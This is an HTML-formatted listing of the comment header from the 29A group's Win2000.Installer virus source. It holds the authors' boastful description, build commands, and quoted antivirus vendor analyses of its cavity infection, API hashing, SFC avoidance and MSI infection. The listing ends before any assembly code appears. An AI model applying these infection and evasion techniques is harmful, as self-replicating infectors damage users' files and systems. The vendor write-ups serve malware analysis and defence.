<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Inta.1688 - installer.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;                                                     ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ</span><span class="sc0">
</span><span class="sc1">;                                                     ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;          Win2000.Installer                          ÜÜÜÛÛß  ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">;          by Benny/29A and Darkman/29A               ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;                                                     ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Author's description</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;We, Benny and Darkman, would like to introduce u the worlds first native</span><span class="sc0">
</span><span class="sc1">;Win2000/EPO/fast mid PE infector. We present u the first Win2k virus, even</span><span class="sc0">
</span><span class="sc1">;before the official releasion of Win2000; the platform which was designed to</span><span class="sc0">
</span><span class="sc1">;be uninfectable by viruses (as M$ guys often say). This virus is also the first</span><span class="sc0">
</span><span class="sc1">;one, which is able to infect MSI files. It searches the all content of actual</span><span class="sc0">
</span><span class="sc1">;disk for files and randomly infects them. Virus can infect up to 18 extensions</span><span class="sc0">
</span><span class="sc1">;(we won't list them here, just look at the end of this source), so it can be</span><span class="sc0">
</span><span class="sc1">;also called as mega-infector X-D. Virus doesn't enlarge the files, nor touchs</span><span class="sc0">
</span><span class="sc1">;any items in PE header. It's able to put itself to the holes inside the files</span><span class="sc0">
</span><span class="sc1">;left by some compilers and patch the host code, so next time the virus code</span><span class="sc0">
</span><span class="sc1">;will be executed as the first. Virus also uses CRC32 instead of stringz, so it</span><span class="sc0">
</span><span class="sc1">;saves many bytes and makes itself undetectable by all current (x-mas 1999) AVs.</span><span class="sc0">
</span><span class="sc1">;The virus is very optimized and doesn't contain any payload. This virus can</span><span class="sc0">
</span><span class="sc1">;run only under Win2000. Virus doesn't infect system files, nor files protected</span><span class="sc0">
</span><span class="sc1">;by SFC - using Win2k SfcIsFileProtected API (that's why it can't run on another</span><span class="sc0">
</span><span class="sc1">;system than Win2000).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Microsoft Windows Installer - the facts</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Have u ever think about the format, in which the installation files on</span><span class="sc0">
</span><span class="sc1">;internet r served? Usually it is one .exe file, created by the InstallShield</span><span class="sc0">
</span><span class="sc1">;Wizard, WinZIP SFX module or another similar programs. Microsoft knew that and</span><span class="sc0">
</span><span class="sc1">;so l8r decided to make its own standard of installation files. Microsoft made</span><span class="sc0">
</span><span class="sc1">;the MSI - MicroSoft Installer file format. MSI is hybrid of everything what</span><span class="sc0">
</span><span class="sc1">;microsoft ever made. MSI can contain VB scripts, binaries (e.g. PE), documents,</span><span class="sc0">
</span><span class="sc1">;resources and other shitz. The Win2000.Installer is able to infect PE files</span><span class="sc0">
</span><span class="sc1">;inside the MSI by simple searching. If the MSI contains any PE files (and it</span><span class="sc0">
</span><span class="sc1">;often contains), then there is 1:2 possibility the PE file will be infected.</span><span class="sc0">
</span><span class="sc1">;Microsoft also doesn't calculate any checksum of the files inside MSIs, so</span><span class="sc0">
</span><span class="sc1">;there ain't any problem with modification of MSI.</span><span class="sc0">
</span><span class="sc1">;Becoz Microsoft still hasn't published the file format of MSIs, we couldn't</span><span class="sc0">
</span><span class="sc1">;make better research (adding scripts, infection by VB and such things), than</span><span class="sc0">
</span><span class="sc1">;just code PE infector. We expect big boom with infection of MSI (its brand</span><span class="sc0">
</span><span class="sc1">;new EXECUTABLE file format), mainly after someone will publish the structure</span><span class="sc0">
</span><span class="sc1">;of MSIs. Until that, we can't do more.</span><span class="sc0">
</span><span class="sc1">;Yeah, and the last good news. Programs, which will want to carry the "Designed</span><span class="sc0">
</span><span class="sc1">;for Microsoft Windows" logo (there r plenty firms which wanna get it), will</span><span class="sc0">
</span><span class="sc1">;have to release the instalation program in MSI form. Even the MSI SDK is</span><span class="sc0">
</span><span class="sc1">;available only in MSI form. Office2000 and MSIE 5.x also use MSI files. We</span><span class="sc0">
</span><span class="sc1">;have the full support of Microsoft!!!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Thanks</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;We would like to thank GriYo/29A for the information regarding System File</span><span class="sc0">
</span><span class="sc1">;Protection (SFP) in Win2000.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;How to build it</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   tasm32 -ml -m9 -q msi.asm</span><span class="sc0">
</span><span class="sc1">;   tlink32 -Tpe -c -x -aa -r  msi,,, import32</span><span class="sc0">
</span><span class="sc1">;   pewrsec msi.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Description from AVP</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win2K.Inta</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;It is not a dangerous nonmemory resident parasitic Windows virus. The virus is</span><span class="sc0">
</span><span class="sc1">;Win2000 specific and does not work under any other Windows version. </span><span class="sc0">
</span><span class="sc1">;When run the virus searches for PE EXE files in the subdirectory tree on the</span><span class="sc0">
</span><span class="sc1">;current drive, then infects them. While infecting the virus looks for unused</span><span class="sc0">
</span><span class="sc1">;"cave" of code in the file, overwrites it with its code and patches the file</span><span class="sc0">
</span><span class="sc1">;entry address with a JMP_Virus instruction. As a result, affected files do not</span><span class="sc0">
</span><span class="sc1">;grow in length, and their functionality is not lowered. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus infects not only Windows executable files that have ".EXE" filename</span><span class="sc0">
</span><span class="sc1">;extension, but also: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; .ACM .AX .CNV .COM .CPL .DLL .DRV .EXE .MPD .OCX .PCI .SCR </span><span class="sc0">
</span><span class="sc1">; .SYS .TSP .TLB .VWP .WPC</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus also looks for .MSI (Microsoft Windows Installer) files, scans them</span><span class="sc0">
</span><span class="sc1">;for embedded PE EXE files and also infects them. </span><span class="sc0">
</span><span class="sc1">;The virus contains the text string: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [Win2000.Installer] by Benny/29A &amp; Darkman/29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Description from F-Secure</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;NAME: Inta </span><span class="sc0">
</span><span class="sc1">;ALIAS: Win2K.Inta, Win2000.Installer </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win2K.Inta is the first virus to infect Windows 2000. Windows 2000 is the new</span><span class="sc0">
</span><span class="sc1">;upcoming operating system from Microsoft, due to be released later this year. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win2K.Inta appears to be written by the 29A virus group. It operates only under</span><span class="sc0">
</span><span class="sc1">;current beta versions of Windows 2000 and is not designed to operate at all</span><span class="sc0">
</span><span class="sc1">;under older versions of Windows. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;F-Secure has received no reports of this virus being in the wild, and it is not</span><span class="sc0">
</span><span class="sc1">;considered a big threat. The most important feature of the virus is capability</span><span class="sc0">
</span><span class="sc1">;to spread under the new operating system. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win2K.Inta works by infecting program files and replicates from a computer to</span><span class="sc0">
</span><span class="sc1">;another when these files are exchanged. Infected files do not grow in size.</span><span class="sc0">
</span><span class="sc1">;The virus infects files with these extensions: EXE, COM, DLL, ACM, AX, CNV,</span><span class="sc0">
</span><span class="sc1">;CPL, DRV, EXE, MPD, OCX, PCI, SCR, SYS, TSP, TLB, VWP, WPC and MSI. This list</span><span class="sc0">
</span><span class="sc1">;includes several classes of programs that were not suspectible to virus</span><span class="sc0">
</span><span class="sc1">;infection before. For example, this virus will analyse Microsoft Windows</span><span class="sc0">
</span><span class="sc1">;Installer files (MSI files), scan them for embedded programs and infect them. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus contains this text string, which is never displayed: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  [Win2000.Installer] by Benny/29A &amp; Darkman/29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Description from Symantec (Benny's comments in [**])</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;W2K.Installer.1676 </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Detected as: W2K.Installer.1676 </span><span class="sc0">
</span><span class="sc1">;Aliases: WIN2K/Insta </span><span class="sc0">
</span><span class="sc1">;Known Variants: W2K.Installer.1688 </span><span class="sc0">
</span><span class="sc1">;Infection Length: 1,676 bytes and 1,688 bytes </span><span class="sc0">
</span><span class="sc1">;Likelihood: Rare </span><span class="sc0">
</span><span class="sc1">;Detected on: Jan 5, 2000 </span><span class="sc0">
</span><span class="sc1">;Characteristics: Windows 2000 </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Description </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;W2K.Installer virus is the first known virus to replicate only under Windows</span><span class="sc0">
</span><span class="sc1">;2000. This virus is not known to be in the wild at this time. There are two</span><span class="sc0">
</span><span class="sc1">;known variants of this virus as of Jan 5, 2000. They are named</span><span class="sc0">
</span><span class="sc1">;W2K.Installer.1676 and W2K.Installer.1688. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Although this virus may be referred as a Windows 2000 specific virus, it does</span><span class="sc0">
</span><span class="sc1">;not use any Windows 2000 specific functionality to replicate [* Not so, the</span><span class="sc0">
</span><span class="sc1">;SfcIsFileProtected is Win2000 specific *]. It spreads only under Windows 2000</span><span class="sc0">
</span><span class="sc1">;because the virus checks the version of Windows before it propagates.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;W2K.Installer is a cavity infector and will not change the file size of the</span><span class="sc0">
</span><span class="sc1">;infected files. The virus will first search through the code section to find</span><span class="sc0">
</span><span class="sc1">;an unused portion that is large enough for the virus to overwrite. These</span><span class="sc0">
</span><span class="sc1">;sections are usually filled with '0xCC' or '0x90' byte values [* Not to</span><span class="sc0">
</span><span class="sc1">;mention the 0x00 byte value*]. When the unused portion is located, the virus</span><span class="sc0">
</span><span class="sc1">;will overwrite its code into the 'cavity' and place a JMP (0xe9) instruction</span><span class="sc0">
</span><span class="sc1">;pointing to the start of the virus body into the entry point code. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The infection happens randomly, but the virus always infects applications with</span><span class="sc0">
</span><span class="sc1">;an MSI' extension. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;MSI is a part of the Windows 2000 installation kit. The virus avoids infecting</span><span class="sc0">
</span><span class="sc1">;files that are protected by SFC (System File Checker). It marks infected files</span><span class="sc0">
</span><span class="sc1">;by modifying the 'MinorLinkerVersion' field of the PE header to 0x29. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus contains the following text in the virus code: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;[Win2000.Installer] by Benny/29A &amp; Darkman/29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;W2K.Installer does not use any specific Windows 2000 functionality to replicate</span><span class="sc0">
</span><span class="sc1">;[* Again the SfcIsFileProtected is Win2000 specific *] and it fails to do so</span><span class="sc0">
</span><span class="sc1">;under some beta and RC versions [* Correct, RC1 and the beta releases before</span><span class="sc0">
</span><span class="sc1">;RC1 *] of Windows 2000. The virus is unique because of the way it infects</span><span class="sc0">
</span><span class="sc1">;files. Similar cavity infection methods were used in older DOS viruses and</span><span class="sc0">
</span><span class="sc1">;virus writers are starting to adapt it again in order to avoid being detected</span><span class="sc0">
</span><span class="sc1">;by first generation heuristic analyzers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Description from NAI (this is really funny description :)</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Name</span><span class="sc0">
</span><span class="sc1">;Win2K/Inta </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Aliases</span><span class="sc0">
</span><span class="sc1">;Unknown </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Variants</span><span class="sc0">
</span><span class="sc1">;None </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Date Added</span><span class="sc0">
</span><span class="sc1">;1/12/00 </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Information</span><span class="sc0">
</span><span class="sc1">;  Discovery Date: 1/11/00 </span><span class="sc0">
</span><span class="sc1">;  Type: Virus </span><span class="sc0">
</span><span class="sc1">;  SubType: Win2K </span><span class="sc0">
</span><span class="sc1">;  Risk Assessment: Low </span><span class="sc0">
</span><span class="sc1">;  Minimum DAT: 4062 </span><span class="sc0">
</span><span class="sc1">;  Minimum Engine: 4.0.25 </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Characteristics</span><span class="sc0">
</span><span class="sc1">;* Note this virus has not been reported to us by any customer and is perceived</span><span class="sc0">
</span><span class="sc1">;to be a low threat at this time.* </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This is a virus specifically for the Windows 2000 operating system however it</span><span class="sc0">
</span><span class="sc1">;is not functional on all editions of Win2K. This virus uses cavity filling</span><span class="sc0">
</span><span class="sc1">;technique similar to Win95/CIH in that empty areas of the file are filled with</span><span class="sc0">
</span><span class="sc1">;the virus code. This virus is reported to be developed by the virus group</span><span class="sc0">
</span><span class="sc1">;known as 29A. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Files of several different extensions are sought during the infection routine</span><span class="sc0">
</span><span class="sc1">;besides the typical EXE, DLL and SCR. For example .DRV, .MPD and .OCX are</span><span class="sc0">
</span><span class="sc1">;included. The significance of this virus is that it is a proof of concept. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;There also is a recognizable string within the infected files containing the</span><span class="sc0">
</span><span class="sc1">;following: [Win2000.Installer] by Benny/29A &amp; Darkman/29A </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This string is never displayed however.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Symptoms</span><span class="sc0">
</span><span class="sc1">;Increase in size to PE files, slowness of Windows 2000 system.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Method Of Infection</span><span class="sc0">
</span><span class="sc1">;Running infected executable will directly infect available files on the local</span><span class="sc0">
</span><span class="sc1">;system.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Removal Instructions</span><span class="sc0">
</span><span class="sc1">;Use specified engine and DAT files for detection and removal.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Description from GeCAD (RAV)</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Virus name: Win2k/Insta </span><span class="sc0">
</span><span class="sc1">;Virus type: Win2k </span><span class="sc0">
</span><span class="sc1">;Aliases: Installer </span><span class="sc0">
</span><span class="sc1">;Known Variants: .1676,.1688 </span><span class="sc0">
</span><span class="sc1">;Infected objects: PE_EXE  </span><span class="sc0">
</span><span class="sc1">;Like Hood: Less Likely </span><span class="sc0">
</span><span class="sc1">;Detection added: 06-01-2000 </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Description: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This is the first Windows 2000 specific virus. Thus most of its code is Win32</span><span class="sc0">
</span><span class="sc1">;compliant, the virus contains a check that makes it do nothing under operating</span><span class="sc0">
</span><span class="sc1">;systems with version smaller than 5 (Win2000). The only part that really depends</span><span class="sc0">
</span><span class="sc1">;on Win2k is the .MSI infection part - this is the new Installer technology</span><span class="sc0">
</span><span class="sc1">;Microsoft included in Win2k (and is also available on earlier versions of</span><span class="sc0">
</span><span class="sc1">;Windows). The virus will pseudo-infect .MSI files in a very simple but effective</span><span class="sc0">
</span><span class="sc1">;way - it will map the file in memory and look for an embedded executable file</span><span class="sc0">
</span><span class="sc1">;inside. If one is found (all .MSIs should have at least one) the virus will try</span><span class="sc0">
</span><span class="sc1">;to locate a cave of do-nothing code (NOP and INT3) inside the executable body</span><span class="sc0">
</span><span class="sc1">;and overwrite this section with its own code. Using this method, the virus will</span><span class="sc0">
</span><span class="sc1">;also be able to infect ANY executable file embedded in the .MSI file (which is</span><span class="sc0">
</span><span class="sc1">;an OLE2 file) - for instance, if there's a .CAB file inside the .MSI file and</span><span class="sc0">
</span><span class="sc1">;one executable inside the CAB file is not compressed, the virus will also be</span><span class="sc0">
</span><span class="sc1">;able to infect it. This raises serious problems concerning the detection of</span><span class="sc0">
</span><span class="sc1">;such infectors - the only way to detect it is to parse the all the embedded</span><span class="sc0">
</span><span class="sc1">;objects inside the file. Because the virus overwrites parts of the host code</span><span class="sc0">
</span><span class="sc1">;infected programs may not run normally or even crash when executed.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;Technical details: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Technically speaking, the virus uses already known ways to infect PE executable</span><span class="sc0">
</span><span class="sc1">;files. When executing an infected file, the virus will scan for the kernel base,</span><span class="sc0">
</span><span class="sc1">;then try to import the following 17 APIs, using checksums computed on API names:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;FindFirstFileA, FindNextFileA, FindClose, SetFileAttr, SetFileTime, </span><span class="sc0">
</span><span class="sc1">;CreateFileA, CreateFileMapping, MapViewOfFile, UnmapViewOfFile, </span><span class="sc0">
</span><span class="sc1">;CloseHandle, GetTickCount, GetVersion, GetCurrentDirectory, </span><span class="sc0">
</span><span class="sc1">;SetCurrentDirectory, LoadLibrary, GetProcAddress</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Then it will look for files in the root folder and sub-directories for files</span><span class="sc0">
</span><span class="sc1">;with the extension matching one of the following:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;.ACM, .AX, .CNV, .COM, .CPL, .DLL, .DRV, .EXE, .MPD, .OCX, .PCI, .SCR, .SYS </span><span class="sc0">
</span><span class="sc1">;.TSP, .TLB, .VWP, .WPC, .MSI</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;For such files, the virus will map the file in memory to ease the infection</span><span class="sc0">
</span><span class="sc1">;process. Then it will check if the respective file is a PE executable file. If</span><span class="sc0">
</span><span class="sc1">;so, it will call the infection routine - this will look for a cave of 0x90/0xCC</span><span class="sc0">
</span><span class="sc1">;large enough to hold the virus body, write the body in there and modify the</span><span class="sc0">
</span><span class="sc1">;entry point to execute the virus code first. Then, for MSI files, the virus will</span><span class="sc0">
</span><span class="sc1">;check if the respective file is an OLE2 file. If so, it will search inside the</span><span class="sc0">
</span><span class="sc1">;file for a PE executable file embedded and infect it. The number of infected</span><span class="sc0">
</span><span class="sc1">;files per execution is randomly selected - the virus contains a random number</span><span class="sc0">
</span><span class="sc1">;generator routine which will decide if it will infect more files or just return</span><span class="sc0">
</span><span class="sc1">;the control to the original code of the host.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus also contains the following string, not used in any way:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;"[Win2000.Installer] by Benny/29A &amp; Darkman/29A"</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Evilness: Potentially destructive (corrupts data while replicating) </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Analyst: Adrian Marinescu </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;News from F-Secure (Benny's comments in [**])</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Espoo, Finland, January 12, 2000, - First Windows 2000 Virus Found </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Virus writers already up to speed with the upcoming operating system </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Espoo, Finland - January 12, 2000 - F-Secure Corporation, a leading provider</span><span class="sc0">
</span><span class="sc1">;of centrally-managed, widely distributed security solutions, today announced</span><span class="sc0">
</span><span class="sc1">;the discovery of the first Windows 2000 virus [* a bit late, don't u think? AVP</span><span class="sc0">
</span><span class="sc1">;was faster by one week! *]. Windows 2000 is the upcoming new operating system</span><span class="sc0">
</span><span class="sc1">;from Microsoft, due to be released later this year. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The new virus is called Win2K.Inta or Win2000.Install. It appears to be</span><span class="sc0">
</span><span class="sc1">;written by the 29A virus group. It operates only under Windows 2000 and is not</span><span class="sc0">
</span><span class="sc1">;designed to operate at all under older versions of Windows. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;F-Secure has received no reports that this virus is in the wild, and it is not</span><span class="sc0">
</span><span class="sc1">;considered a big threat. The most important feature of the virus is its</span><span class="sc0">
</span><span class="sc1">;capability to spread under the new operating system. "Now we can expect virus</span><span class="sc0">
</span><span class="sc1">;writers to include Windows 2000 compatibility as a standard feature in new</span><span class="sc0">
</span><span class="sc1">;viruses", comments Mikko Hypponen, Manager of Anti-Virus Research at F-Secure. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win2K.Inta works by infecting program files and spreads from one computer to</span><span class="sc0">
</span><span class="sc1">;another when these files are exchanged. The infected files do not grow in size.</span><span class="sc0">
</span><span class="sc1">;The virus infects files with the following extensions: EXE, COM, DLL, ACM, AX,</span><span class="sc0">
</span><span class="sc1">;CNV, CPL, DRV, MPD, OCX, PCI, SCR, SYS, TSP, TLB, VWP, WPC and MSI. This list</span><span class="sc0">
</span><span class="sc1">;includes several classes of programs that were not susceptible to virus</span><span class="sc0">
</span><span class="sc1">;infection before. For example, this virus will analyse Microsoft Windows</span><span class="sc0">
</span><span class="sc1">;Installer files (MSI files), scan them for embedded programs and infect them</span><span class="sc0">
</span><span class="sc1">;[* yeah, MSIs rulez!!! *].</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus contains this text string, which is never displayed: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;[Win2000.Installer] by Benny/29A &amp; Darkman/29A </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Further technical information and a screenshot of the virus is available at:</span><span class="sc0">
</span><span class="sc1">;http://www.F-Secure.com/virus-info/v-pics/ </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;News from CNN &amp; InfoWorld (Benny's comments in [**])</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Anti-virus software vendor F-Secure announced it has received a sample of the</span><span class="sc0">
</span><span class="sc1">;first virus written specifically to operate under Microsoft's forthcoming</span><span class="sc0">
</span><span class="sc1">;Windows 2000 operating system.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Known as Win2K.Inta, or Win2000.Install, F-Secure does not consider the virus</span><span class="sc0">
</span><span class="sc1">;to be a big threat since it has received no reports that the virus is "in the</span><span class="sc0">
</span><span class="sc1">;wild," meaning that it has not yet been discovered outside of controlled</span><span class="sc0">
</span><span class="sc1">;environments, said Mikko Hyppönen, manager of anti-virus research at the</span><span class="sc0">
</span><span class="sc1">;Finland-based company. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus operates only under Windows 2000 and is not designed to function at</span><span class="sc0">
</span><span class="sc1">;all under older versions of Windows. Microsoft is scheduled to start commercial</span><span class="sc0">
</span><span class="sc1">;shipments of the new operating system by mid-February.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
